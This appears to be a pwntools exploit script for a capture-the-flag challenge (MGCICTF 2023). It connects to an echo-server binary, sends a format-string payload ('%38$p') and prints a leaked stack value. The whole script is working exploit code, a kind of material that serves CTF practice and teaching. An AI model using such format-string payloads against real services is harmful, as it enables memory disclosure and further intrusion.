#!/usr/bin/env python3

#===========================================================
#                      MGCICTF 2023
#===========================================================

from pwn import *

exe = context.binary = ELF('./fmt1.elf')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil(b'Welcome to the echo server... Echo!!\n')

# 6 => 0:rdi, 1:rsi, 2:rdx, 3:r10, 4:r8, 5:r9, 6:stack
# +0 => stack[0]
# +32 => stack[32]
stack_num = 6 + (0x100 // 8)
payload = f'%{stack_num}$p'.encode()    # %38$p
io.sendline(payload)

resp = io.recv()
print( p64(eval(resp)) )